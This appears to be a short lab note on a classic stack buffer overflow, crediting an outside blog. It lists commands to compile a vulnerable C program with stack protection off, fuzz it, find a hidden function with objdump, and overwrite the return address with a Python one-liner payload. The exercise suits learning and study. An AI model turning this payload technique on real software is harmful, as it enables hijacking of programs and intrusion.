For a freeish cloud VM, check out cloud.google.com, you get $300 credit towards compute for your first year. This can also be done in any linux virtual machine you build.

The code and example is from https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/

If you don't get the same memory address for vuln.c, you'll have to work on it. Or...: wget https://dhavalkapil.com/assets/files/Buffer-Overflow-Exploit/vuln

```
vi vuln.c
gcc vuln.c -o vuln -fno-stack-protector -m32
./vuln
vi fuzz.py
python fuzz.py
objdump -d vuln
objdump -d vuln | grep secret
python -c 'print "a"*32 + "\x9d\x84\x04\x08"' | ./vuln
```
